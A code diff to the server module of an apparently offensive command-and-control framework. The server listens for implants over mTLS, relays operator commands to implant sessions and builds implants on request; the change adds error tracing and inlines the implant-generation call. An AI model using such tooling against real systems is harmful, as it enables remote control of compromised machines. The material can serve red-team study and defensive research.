@@ -9,6 +9,7 @@ from handler.handler import Handler
 from pb import operatorpb_pb2
 
 import socket
+import traceback
 import threading
 
 class C2Server(object):
@@ -23,6 +24,7 @@ class C2Server(object):
             self.implantlistener = mtls.Listener(self.requestq, "127.0.0.1:31337") #begins implant listener w/ mtls encryption
         except Exception as e:
             print(e)
+            traceback.print_exc()
             exit(1)
 
         ## Generating stuff for operator comms ##
@@ -56,11 +58,6 @@ class C2Server(object):
             conn, addr = self.implantlistener.sessions.get(session_id) 
             output = mtls.session(conn, command_str)
             return (output)
-
-    def _generate(self, endpoint, target_os):
-        # Compile an implant
-        print("Generating the implant...")
-        generate(self.implantlistener.client_certs, endpoint, target_os)
 
     def _accept_operator(self):
         numberOfUsers = 5
@@ -104,10 +101,11 @@ class C2Server(object):
                     self._send_operator(out,operator,session_id)
 
             elif message.message_type==operatorpb_pb2.Message.MessageType.Generate:
+                print("Generating the implant...")
                 logging.info("Client requested to generate")
                 generate_cmd = operatorpb_pb2.Generate()
                 generate_cmd.ParseFromString(message.data)
-                self._generate(generate_cmd.endpoint, generate_cmd.target_os)
+                generate(generate_cmd.endpoint, generate_cmd.target_os)
 
 
 def main():
